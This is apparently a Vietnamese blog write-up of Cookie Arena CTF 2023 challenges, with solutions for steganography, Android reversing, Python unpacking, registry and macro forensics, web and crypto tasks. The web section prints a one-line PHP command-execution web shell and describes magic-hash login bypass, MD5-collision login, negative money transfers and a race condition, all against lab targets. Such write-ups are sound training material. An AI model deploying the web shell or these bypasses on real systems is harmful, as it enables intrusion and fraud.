v[2] + 0x23A * v[3] - 0x3D1 * v[4] + 0x152 * v[5] + 0x221 * v[6] - 0x2FC * v[7] - 0x0DF * v[8] - 0x36F * v[9] + 0x1A2 * v[10] + 0x179 * v[11] + 0x284 * v[12] - 0x64 * v[13] == 0x0F0ED, 0x328 * v[0] + 0x3CD * v[1] + 0x3CC * v[2] + 0x329 * v[3] + 0x0EA * v[4] - 0x1A * v[5] + 0x12B * v[6] - 0x2E * v[7] - 0x337 * v[8] + 0x262 * v[9] + 0x37 * v[10] - 0x0A4 * v[11] + 0x383 * v[12] + 0x2D5 * v[13] == 0x66098, 0x66 * v[0] - 0x3C9 * v[1] - 0x0C0 * v[2] - 0x0BD * v[3] - 0x9D * v[4] + 0x2D1 * v[5] - 0x299 * v[6] + 0x38E * v[7] + 0x15 * v[8] - 0x14E * v[9] + 0x280 * v[10] + 0x0E1 * v[11] - 0x128 * v[12] + 0x50 * v[13] == 0x6CE4, 0x2ED * v[0] + 0x8A * v[1] - 0x155 * v[2] - 0x8C * v[3] - 0x239 * v[4] + 0x259 * v[5] - 0x286 * v[6] - 0x1DA * v[7] + 0x154 * v[8] - 0x196 * v[9] + 0x97 * v[10] + 0x26D * v[11] + 0x3E0 * v[12] - 0x1EB * v[13] == 0x150DD, 0x46 * v[0] - 0x2DF * v[1] + 0x243 * v[2] + 0x78 * v[3] - 0x0EE * v[4] + 0x99 * v[5] - 0x0C5 * v[6] - 0x0EB * v[7] - 0x0AE * v[8] + 0x28F * v[9] - 0x65 * v[10] + 0x20B * v[11] - 0x147 * v[12] + 0x3C2 * v[13] == 0x1E68B, 0x264 * v[0] + 0x2BE * v[1] + 0x3B5 * v[2] - 0x1D3 * v[3] - 0x8 * v[4] - 0x150 * v[5] + 0x3C1 * v[6] - 0x3E4 * v[7] - 0x58 * v[8] - 0x19C * v[9] + 0x3AA * v[10] + 0x261 * v[11] - 0x17F * v[12] - 0x167 * v[13] == 0x18490, 0x0B3 * v[0] - 0x63 * v[1] - 0x0E0 * v[2] + 0x24 * v[3] + 0x37C * v[4] + 0x0AA * v[5] + 0x33 * v[6] - 0x11E * v[7] - 0x13D * v[8] + 0x139 * v[9] + 0x3DC * v[10] - 0x14C * v[11] + 0x2DD * v[12] + 0x2B3 * v[13] == 0x3CC54, 0x102 * v[0] + 0x115 * v[1] + 0x0D3 * v[2] + 0x0DC * v[3] + 0x3A1 * v[4] - 0x35C * v[5] - 0x0ED * v[6] + 0x141 * v[7] - 0x19C * v[8] - 0x2B6 * v[9] + 0x3CC * v[10] + 0x3AA * v[11] + 0x24B * v[12] + 0x1B9 * v[13] == 0x45670, 0x3C4 * v[0] + 0x305 * v[1] - 0x0A9 * v[2] + 0x87 * v[3] - 0x0E6 * v[4] + 0x30 * v[5] + 0x20F * v[6] - 0x3D0 * v[7] - 0x94 * v[8] - 0x2CC * v[9] + 0x56 * v[10] + 0x224 * v[11] + 0x1B5 * v[12] + 0x183 * v[13] == 0x21A0F, 0x256 * v[0] + 0x157 * v[1] + 0x181 * v[2] - 0x306 * v[3] - 0x243 * v[4] - 0x9 * v[5] - 0x373 * v[6] - 0x1A3 * v[7] + 0x223 * v[8] + 0x200 * v[9] - 0x365 * v[10] - 0x56 * v[11] + 0x1B6 * v[12] - 0x39C * v[13] == 0x0FFFE3896, 0x0A3 * v[0] + 0x2B2 * v[1] + 0x22D * v[2] + 0x3D6 * v[3] - 0x9A * v[4] - 0x76 * v[5] - 0x2A0 * v[6] + 0x63 * v[7] + 0x373 * v[8] + 0x15 * v[9] - 0x3B9 * v[10] + 0x214 * v[11] - 0x232 * v[12] + 0x225 * v[13] == 0x22874, 0x151 * v[0] + 0x153 * v[1] + 0x25F * v[2] - 0x187 * v[3] - 0x2AC * v[4] + 0x1CC * v[5] - 0x155 * v[6] - 0x2F5 * v[7] - 0x22D * v[8] + 0x17B * v[9] - 0x377 * v[10] - 0x0B2 * v[11] - 0x294 * v[12] - 0x2CE * v[13] == 0x0FFFBEC4D, 0x2AA * v[0] + 0x95 * v[1] + 0x83 * v[2] + 0x25B * v[3] - 0x77 * v[4] - 0x2E1 * v[5] + 0x39D * v[6] + 0x251 * v[7] + 0x0A2 * v[8] - 0x27D * v[9] + 0x268 * v[10] + 0x2F9 * v[11] + 0x14 * v[12] - 0x115 * v[13] == 0x3C5E6 ] for equation in equations: solver.add(equation) if solver.check() == sat: model = solver.model() solution = [model.evaluate(i).as_long() for i in v] print(f&#39;{solution}&#39;) else: print(&quot;No solution&quot;) flag = &quot;&quot; for i in solution: flag += chr(i) print(flag) Key: q20OK36QBiWkZT Flag: CHH{COOk13_4R3n4} 0x04 Forensic Sổ đăng ký Description Hòa thấy hiện tượng lạ mỗi khi anh ta khởi động máy tính. Anh ta nghĩ rằng việc tải các video không lành mạnh gần đây đã khiến máy tính của anh ta bị hack. Tải challenge: Sổ đăng ký (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Bài toán này, chúng ta nhận được file NTUSER.DAT. Mở file bằng tool Registry Finder, tìm những từ khóa như cmd.exe, powershell.exe để xem có thể khai thác được thông tin gì không. Chúng ta thu được một đoạn shell code khả nghi. Nhận thấy có mã hóa base64. Chúng ta đem lên CyberChef để giải mã và thu được flag. Flag: CHH{N0_4_go_n0_st4r_wh3r3} Tin học văn phòng cơ bản Description Sau khi tham gia một khóa Tin học văn phòng cơ bản, Hòa đã có thể tự tạo một tệp tài liệu độc hại và anh ta có ý định sẽ dùng nó để hack cả thế giới Tải challenge: Tin học văn phòng cơ bản (pass: cookiehanhoan) Format FLAG: CHH{XXX} Solution Chúng ta sử dụng tool olevba để kiểm tra các macro VBA. Flag: CHH{If_u_w4nt_1_will_aft3rnull_u} 0x05 Web Magic Login Description Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flag.txt hãy tìm cách đọc được chúng. Format Flag: CHH{XXX} Solution Để giải quyết bài toán này, password sau khi hash sha256 phải bằng 0. Những hash này đều có điểm chung là bắt đầu bằng 0e. Lên https://github.com/spaze/hashes, chọn một password tùy thích. Đăng nhập với password = TyNOQHUS. Đến đây, chúng ta chỉ cần upload shell đơn giản. &lt;?php echo system($_GET[&#39;cmd&#39;]); ?&gt; Flag: CHH{PHP_m4g1c_tr1ck_0lD_but_g0lD_ec3f73ad46f1da5e1f1931a0bb288e0c} Magic Login Harder Description Hãy quan sát chức năng đăng nhập, nó có tồn tại những lỗ hổng nghiêm trọng. FLAG được lưu trong /flagXXX.txt hãy tìm cách đọc được chúng. FLAG=$(cat /dev/urandom | tr -dc &#39;a-zA-Z0-9&#39; | fold -w 5 | head -n 1) cp /flag.txt /flag$FLAG.txt Tải challenge: Magic Login Harder (pass: cookiehanhoan) Format Flag: CHH{XXX} Solution &lt;?php if(isset($_POST[&quot;submit&quot;])){ $username = base64_decode($_POST[&#39;username&#39;]); $password = base64_decode($_POST[&#39;password&#39;]); if(($username == $password)){ echo &#39;Username and password are not the same&#39;; } else if((md5($username)===md5($password))){ $_SESSION[&#39;username&#39;] = $username; header(&#39;Location: admin.php?file=1.txt&#39;); } else { echo &#39;Username and password are wrong&#39;; } } ?&gt; Để giải quyết bài toán này, chúng ta phải đi tìm 2 chuỗi username và password khác nhau nhưng đều có cùng giá trị MD5. Hướng khai thác MD5 Collision Chỉ cần lên Google, search một chút về vấn đề này, chúng ta có được kết quả khá ưng ý. Can two different strings generate the same MD5 hash code? MD5 Collision Demo import hashlib import base64 x = &#39;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa200a8284bf36e8e4b55b35f427593d849676da0d1555d8360fb5f07fea2&#39; y = &#39;4dc968ff0ee35c209572d4777b721587d36fa7b21bdc56b74a3dc0783e7b9518afbfa202a8284bf36e8e4b55b35f427593d849676da0d1d55d8360fb5f07fea2&#39; x = bytes.fromhex(x) y = bytes.fromhex(y) print(x == y, hashlib.md5(x).hexdigest() == hashlib.md5(y).hexdigest()) x = base64.b64encode(x) y = base64.b64encode(y) print(x) print(y) # x = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6IAqChL826OS1WzX0J1k9hJZ22g0VVdg2D7Xwf+og== # y = Tclo/w7jXCCVctR3e3IVh9Nvp7Ib3Fa3Sj3AeD57lRivv6ICqChL826OS1WzX0J1k9hJZ22g0dVdg2D7Xwf+og== Login thành công với cặp (x, y) thu được ở trên. Sau đó chuyển qua trang admin.php để xử lý tiếp bài toán. Be Positive Description Libra Dnuf Marketplace Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob. After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal. To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state. Solution Từ tên bài toán và là bài web dễ nhất trong đề. Khả năng cao bài toán sẽ có lỗ hổng chuyển tiền âm. Vào tab Transfer, chỉnh sửa giá trị min = -99999 rồi chuyển tiền cho Bob với số tiền là -2000. Bây giờ, chúng ta đã có dư tiền để mua flag. Flag: CHH{BE_cAr3fUL_WitH_NE6ATIV3_NumBeR_a2c3d35c666e930911bfb0777e1e93ae} Slow Down Description Libra Dnuf Marketplace Libra Dnuf is known underground as a marketplace to sell sensitive information and lost secrets. This place has long closed registration but only allows reputable members to exchange items. During a reconnaissance, 0x1115 team caught the exchange of two members codenamed alice and bob. After analyzing the packets, 0x1115 was able to decrypt the passwords for alice and bob that matched the usernames. With this loophole, the analysis team continues to detect the Transfer Function between users after passing the authentication portal. To avoid wake a sleeping dog, 0x1115 quickly took a snapshot of Libra Dnuf market and transferred it to CookieArena for investigation to find the important file in the flag package. We also recommend to be careful with the rollback option, because using this function all data will be reset to its original state. Solution Ở bài toán này, cấu trúc tương tự như bài Be Positive nhưng đã bị filter số âm. Nhận thấy, phản hồi chuyển tiền thành công về khá lâu, cộng thêm tên bài toán là Slow Down. Từ đấy, mình nghĩ hướng xử lý bài toán liên quan tới Race Condition. Sử dụng 2 trình duyệt khác nhau, cùng login với tài khoản Alice và chuyển tiền đến Bob. Flag: CHH{ea5y_RaCe_CONd17iOn_e84d1b098a499d032afe243ab64dd49a} 0x06 Crypto Basic Operator Description Sử dụng kiến thức toán học và cấu trúc đại số để giải mã flag Tải challenge: Basic Operator (pass: cookiehanhoan) Solution from Crypto.Util import number def padding_pkcs7(data,block_size=4): tmp = len(data) + (block_size - len(data) % block_size) return data.ljust(tmp,bytes([block_size-(len(data)%block_size)])) def split_block(data,block_size): return list(int.from_bytes(data[i:i+block_size],&#39;little&#39;) for i in range(0,len(data),block_size)) def plus_func(data,shift): return (data+shift)&amp;0xffffffff def mul_func(data,mul): return (data*mul)&amp;0xffffffff def xor_shift_right_func(data,bit_loc): return (data^(data&gt;&gt;bit_loc))&amp;0xffffffff def pow_func(data,e,p): return pow(data,e,p) def exp_func(data,base,p): return pow(base,data,p) def ecb_mode(data): return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4)) if __name__==&#39;__main__&#39;: p = 1341161101353773850779 e = 2 mess = b&#39;CHH{CENSORED}&#39; cipher_flag = ecb_mode(mess) print(cipher_flag) Nhận thấy bài toán mã hóa từng block 4 byte một. Vì vậy, chúng ta hoàn toàn có thể brute-force các kí tự để đoán từng block một. Để giải quyết bài toán này, chúng ta có hai cách để giải: Brute-force từng block một như đã phân tích ở trên Dựng ngược lại các hàm đã cho để đi tìm flag Cách giải 1. Nhận thấy rằng Cipher có 12 block, với 4 chữ cái đầu tiên của flag sẽ là “CHH{“. Quan sát kết quả mã hóa block đầu tiên này và so sánh với Cipher, ta khẳng định được: Block đầu tiên của flag là “CHH{“ Block cuối cùng của flag có 1, 2 hoặc 3 kí tự. Vậy các trường hợp có thể xảy ra là: b’}\\x03\\x03\\x03’ b’x}\\x02\\x02’ b’xx}\\x01’ from tqdm import tqdm from string import printable def padding_pkcs7(data,block_size=4): tmp = len(data) + (block_size - len(data) % block_size) return data.ljust(tmp,bytes([block_size-(len(data)%block_size)])) def split_block(data,block_size): return list(int.from_bytes(data[i:i+block_size],&#39;little&#39;) for i in range(0,len(data),block_size)) def plus_func(data,shift): return (data+shift)&amp;0xffffffff def mul_func(data,mul): return (data*mul)&amp;0xffffffff def xor_shift_right_func(data,bit_loc): return (data^(data&gt;&gt;bit_loc))&amp;0xffffffff def pow_func(data,e,p): return pow(data,e,p) def exp_func(data,base,p): return pow(base,data,p) def ecb_mode(data): return list(pow_func(exp_func(xor_shift_right_func(mul_func(plus_func(block,3442055609),2898124289),1),e,p),e,p) for block in split_block(padding_pkcs7(data,4),4)) p = 1341161101353773850779 e = 2 Cipher = [752589857254588976778, 854606763225554935934, 102518422244000685572, 779286449062901931327, 424602910997772742508, 1194307203769437983433, 501056821915021871618, 691835640758326884371, 778501969928317687301, 1260460302610253211574, 833211399330573153864, 223847974292916916557] def brute(index): if index != 11: for x in tqdm(range(len(printable))): for y in tqdm(range(len(printable))): for z in range(len(printable)): for t in range(len(printable)): flag = (printable[x] + printable[y] + printable[z] + printable[t]).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() else: # b&#39;}\\x03\\x03\\x03&#39; # b&#39;x}\\x02\\x02&#39; # b&#39;xx}\\x01&#39; for x in tqdm(range(len(printable))): for y in range(len(printable)): flag = (printable[x] + printable[y] + &#39;}&#39;).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() flag = (printable[y] + &#39;}&#39;).encode() if ecb_mode(flag)[0] == Cipher[index]: print(flag) exit() if __name__ == &#39;__main__&#39;: for i in range(12): brute(i) Flag: CHH{w3lc0m3_70_7h3_m47h_w0rld(1_h4t3_1t_th3r3)}","headline":"Cookie Arena CTF 2023","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/07/10/Cookiehanhoan.html"},"url":"http://localhost:4000/2023/07/10/Cookiehanhoan.html"}</script>
<!-- End Jekyll SEO tag -->

  
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">George Do</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
        
          
        
          
          <a class="page-link" href="/list100/">List 100</a>
          
        
          
        
          
          <a class="page-link" href="/note.html">Notes</a>
          
        
          
          <a class="page-link" href="/post/">Post</a>
          
        
          
        
      </div>
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <script type="text/x-mathjax-config">
  MathJax.Hub.Config({
    tex2jax: {
      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
      inlineMath: [['$','$']], 
    }
  });
</script>

<script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML" type="text/javascript"></script>

<script>
  /**
  *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
  *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables    */
  
  var disqus_config = function () {
  this.page.url = page.url ;  // Replace PAGE_URL with your page's canonical URL variable
  this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
  };
  
  (function() { // DON'T EDIT BELOW THIS LINE
  var d = document, s = d.createElement('script');
  s.src = 'https://https-geordo-github-io.disqus.com/embed.js';
  s.setAttribute('data-timestamp', +new Date());
  (d.head || d.body).appendChild(s);
  })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

<article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">Cookie Arena CTF 2023</h1>
    <p class="post-meta"><time datetime="2023-07-10T00:00:00+07:00" itemprop="datePublished">Jul 10, 2023</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <h2 id="table-of-contents">
  
  
    Table of Contents <a href="#table-of-contents">#</a>
  
  
</h2>
    

<ul>
  <li><a href="#0x00-giới-thiệu">0x00 Giới thiệu</a></li>
  <li><a href="#0x01-stenography">0x01 Stenography</a>
    <ul>
      <li><a href="#cutie-k1tty">Cutie K1tty</a></li>
    </ul>
  </li>
  <li><a href="#0x02-mobile">0x02 Mobile</a>
    <ul>
      <li><a href="#cat-me">Cat Me</a></li>
      <li><a href="#pinned-cookie">Pinned Cookie</a></li>
    </ul>
  </li>
  <li><a href="#0x03-reverse">0x03 Reverse</a>
    <ul>
      <li><a href="#pyreverse">Pyreverse</a></li>
      <li><a href="#jump">Jump</a></li>
      <li><a href="#rev1">Rev1</a></li>
    </ul>
  </li>
  <li><a href="#0x04-forensic">0x04 Forensic</a>
    <ul>
      <li><a href="#sổ-đăng-ký">Sổ đăng ký</a></li>
      <li><a href="#tin-học-văn-phòng-cơ-bản">Tin học văn phòng cơ bản</a></li>
    </ul>
  </li>
  <li><a href="#0x05-web">0x05 Web</a>
    <ul>
      <li><a href="#magic-login">Magic Login</a></li>
      <li><a href="#magic-login-harder">Magic Login Harder</a></li>
      <li><a href="#be-positive">Be Positive</a></li>
      <li><a href="#slow-down">Slow Down</a></li>
    </ul>
  </li>
  <li><a href="#0x06-crypto">0x06 Crypto</a>
    <ul>
      <li><a href="#basic-operator">Basic Operator</a></li>
    </ul>
  </li>
</ul>
<h2 id="0x00-giới-thiệu">
  
  
    0x00 Giới thiệu <a href="#0x00-giới-thiệu">#</a>
  
  
</h2>
    
<p>Hai ngày cuối tuần, mình cùng một số anh em trong câu lạc bộ chơi giải <a href="https://battle.cookiearena.org/arenas/cookie-arena-ctf-season-2">Cookie Arena CTF 2023</a>. Cuộc thi được diễn ra liên tục trong 48 giờ. Chắc do bị DDOS bất ngờ, đáng lẽ cuộc thi được bắt đầu từ 21h nhưng phải hoãn lại. Sang tới tận ngày hôm sau chúng mình mới có thể chơi bình thường.</p>

<p>Đây là lần đầu tiên mình tham gia trọn vẹn một kỳ thi CTF online. Cuộc thi diễn ra theo hình thức cá nhân, nhưng bọn mình lại chơi cùng nhau. Kết quả cả đội đứng thứ 6 chung cuộc nhưng sẽ không viết writeup và nhận quà từ ban tổ chức do vi phạm quy định hehe.</p>

<p>Dưới đây là bài giải cho một số bài mình làm được trong cuộc thi và sau khi có được hướng dẫn từ các anh chị khác.</p>

<p><img src="/images/cookiehanhoan2023/image.png" alt="Alt text" /></p>
<h2 id="0x01-stenography">
  
  
    0x01 Stenography <a href="#0x01-stenography">#</a>
  
  
</h2>
    
<h3 id="cutie-k1tty">
  
  
    Cutie K1tty <a href="#cutie-k1tty">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Một chú mèo cute chứa đựng nhiều điều bí ẩn. Hãy tìm ra điều thú vị đó.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/18iGHuowoRUsWqwNmnuWqrqsHbMLwBJG_/view?usp=drive_link">CutieK1tty</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Bài toán cho chúng ta hình ảnh một con mèo</p>

<p><img src="/images/cookiehanhoan2023/cut3_c4t.png" alt="Alt text" /></p>

<p>Như thường lệ, mình sẽ kiểm tra bức ảnh này có ẩn dấu những cụm từ nào đáng chú ý hay không</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>strings cut3_c4t.png
y0u_4r3_cl0s3.rar
Cat!
f1n4lly.txt
</code></pre></div></div>

<p>Chúng ta thấy có khá nhiều từ khả nghi ở đây. mình sẽ thử chuyển file png này thành file zip để xem có thể khai thác được gì không.</p>

<p>Khi giải nén ra, ta thu được 2 file mới là <code class="language-plaintext highlighter-rouge">purrr_2.mp3</code> và <code class="language-plaintext highlighter-rouge">y0u_4r3_cl0s3.rar</code>. Tiếp tục giải nén file <code class="language-plaintext highlighter-rouge">y0u_4r3_cl0s3.rar</code>, xuất hiện thông báo lỗi</p>

<p><img src="/images/cookiehanhoan2023/image-5.png" alt="Alt text" /></p>

<p>Đưa file này vào <code class="language-plaintext highlighter-rouge">HxD</code> để kiểm tra các magic byte, phát hiện ra file đã bị corrupt do header của nó là <strong>Cat</strong>. Ở đây, chúng ta chỉ cần sửa header lại thành <strong>Rar</strong> là có thể giải nén được.</p>

<p><img src="/images/cookiehanhoan2023/image-6.png" alt="Alt text" /></p>

<p>Nhận thấy còn file <code class="language-plaintext highlighter-rouge">purrr_2.mp3</code> chưa được sử dụng. Khả năng cao nó chứa password của file rar ở trên.</p>

<p>Sử dụng tool <code class="language-plaintext highlighter-rouge">Audacity</code>, ta có được <strong>sp3ctrum_1s_y0ur_fr13nd</strong> là password để giải nén.</p>

<p><img src="/images/cookiehanhoan2023/image-8.png" alt="Alt text" /></p>

<p>Đến đây, chúng ta chỉ cần decode base64 quen thuộc sẽ tìm ra được flag</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">atob</span><span class="p">(</span><span class="dl">"</span><span class="s2">ZjByM241MWNzX21hNXQzcg==</span><span class="dl">"</span><span class="p">)</span>
<span class="dl">'</span><span class="s1">f0r3n51cs_ma5t3r</span><span class="dl">'</span>
</code></pre></div></div>

<p><strong>Flag: CHH{f0r3n51cs_ma5t3r}</strong></p>
<h2 id="0x02-mobile">
  
  
    0x02 Mobile <a href="#0x02-mobile">#</a>
  
  
</h2>
    
<h3 id="cat-me">
  
  
    Cat Me <a href="#cat-me">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Với người dùng bình thường, họ không thể nhìn thấy gì. Nhưng hacker thì họ luôn có cách khác. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1Uq8wLlBl3glN5nbHMW5tkiP5IDrZlJ0D/view?usp=drive_link">Cat Me</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Dùng <code class="language-plaintext highlighter-rouge">jadx</code> để decompile file apk. Sử dụng search để tìm các cụm từ khả nghi. Khi search từ khóa <strong>flag</strong>, chúng ta thấy có đoạn mã sau khả nghi.</p>

<p><img src="/images/cookiehanhoan2023/image-4.png" alt="Alt text" /></p>

<p>Copy hết các ký tự trong <code class="language-plaintext highlighter-rouge">arrayList</code>, nhận thấy rằng đây là <strong>base64</strong>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">"</span><span class="s">Q0hIe00wcmVfMW43RVIzU1RJTjlfN2gxTjZfMU5fbG9nY2F0fQ==</span><span class="sh">"</span>
<span class="n">flag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag: CHH{M0re_1n7ER3STIN9_7h1N6_1N_logcat}</strong></p>
<h3 id="pinned-cookie">
  
  
    Pinned Cookie <a href="#pinned-cookie">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Một kết nối cực an toàn giữa người dùng và server đã được thiết lập. Kẻ tấn công không thể đứng giữa để nghe ngóng thông tin. Ứng dụng hoạt động tốt trên các thiết bị Android API 24 trở lên</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/1oagLC-ryf9leAl4LrD9zVETTB6cPZDk_/view?usp=drive_link">Pinned Cookie</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Quan sát trong <code class="language-plaintext highlighter-rouge">jadx</code>, chúng ta thấy có hàm <code class="language-plaintext highlighter-rouge">MainActivity</code></p>

<p><img src="/images/cookiehanhoan2023/image-2.png" alt="Alt text" /></p>

<p>Nhìn tổng quan hàm, chúng ta lại thấy đoạn code <code class="language-plaintext highlighter-rouge">arrayList</code> quen thuộc giống như bài <code class="language-plaintext highlighter-rouge">Cat Me</code>. Ở đây, xuất hiện thêm một chuỗi lạ là <strong>“sTroN6PaSswORD”</strong>.</p>

<p><img src="/images/cookiehanhoan2023/image-1.png" alt="Alt text" /></p>

<p>Tiếp tục đi sâu vào từng hàm có liên quan tới chuỗi này. Chúng ta tìm thấy một hàm khả nghi</p>

<p><img src="/images/cookiehanhoan2023/image-3.png" alt="Alt text" /></p>

<p>Nội dung chính của hàm <code class="language-plaintext highlighter-rouge">y0</code> này là đi decode chuỗi base64 thu được từ <code class="language-plaintext highlighter-rouge">arrayList</code>, tiếp đến xor từng byte một với chuỗi ký tự <strong>“sTroN6PaSswORD”</strong>.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span> 

<span class="n">key</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sTroN6PaSswORD</span><span class="sh">'</span>
<span class="n">base64_str</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">MBw6FDdZBT4wRzkQMB0jYEc8EUUDLQwjPiE8LR0TDw==</span><span class="sh">'</span>

<span class="n">bytesFlag</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">b64decode</span><span class="p">(</span><span class="n">base64_str</span><span class="p">)</span>

<span class="n">flag</span> <span class="o">=</span> <span class="sh">""</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="nf">len</span><span class="p">(</span><span class="n">bytesFlag</span><span class="p">)):</span> 
    <span class="n">flag</span> <span class="o">+=</span> <span class="nf">chr</span><span class="p">(</span><span class="n">bytesFlag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">key</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="nf">len</span><span class="p">(</span><span class="n">key</span><span class="p">)])</span>

<span class="nf">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div></div>

<p><strong>Flag: CHH{yoU_c4N_bYP45S_sSL_PInninG}</strong></p>
<h2 id="0x03-reverse">
  
  
    0x03 Reverse <a href="#0x03-reverse">#</a>
  
  
</h2>
    
<h3 id="pyreverse">
  
  
    Pyreverse <a href="#pyreverse">#</a>
  
  
</h3>
    

<p><strong>Description</strong></p>

<p>Trong quá trình phân tích các Tool Auto Game, chúng mình phát hiện ra kỹ thuật khá phổ biến trong việc viết mã và đóng gói chương trình. Hãy tìm ra kỹ thuật này và tìm cách dịch ngược chúng, FLAG bí mật ẩn được ẩn chứa bên trong.</p>

<p>Tải challenge: <a href="https://drive.google.com/file/d/18g2ZqlfYS4pfEZbAxJD1_9wIVp3KS1A-/view?usp=drive_link">Pyreverse</a> (pass: cookiehanhoan)</p>

<p><strong>Format FLAG: CHH{XXX}</strong></p>

<p><strong>Solution</strong></p>

<p>Sử dụng <code class="language-plaintext highlighter-rouge">Detect It Easy</code>, kiểm tra file <strong>.exe</strong> được pack bằng <strong>PyInstaller</strong>. Tới đây, mình sử dụng công cụ <a href="https://github.com/extremecoders-re/pyinstxtractor">pyinstxtractor</a> để unpack lại file <strong>.py</strong> ban đầu.</p>

<p><img src="/images/cookiehanhoan2023/image-7.png" alt="Alt text" /></p>

<p>Sau khi thu được file <code class="language-plaintext highlighter-rouge">pyreverser.pyc</code>, mình tiếp tục lên <a href="https://ctfever.uniiem.com">CTFever</a> để decompile file <strong>.pyc</strong> thành <strong>.py</strong> ban đầu.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Decompiled on CTFever Premium
# Decompile engine: Decompyle++ (pycdc)
# Python version: 3.10
</span>
<span class="kn">import</span> <span class="n">base64</span>

<span class="k">def</span> <span class="nf">reverse_string</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">s</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>


<span class="k">def</span> <span class="nf">scramble_flag</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
    <span class="n">scrambled</span> <span class="o">=</span> <span class="sh">''</span>
    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">char</span> <span class="ow">in</span> <span class="nf">enumerate</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
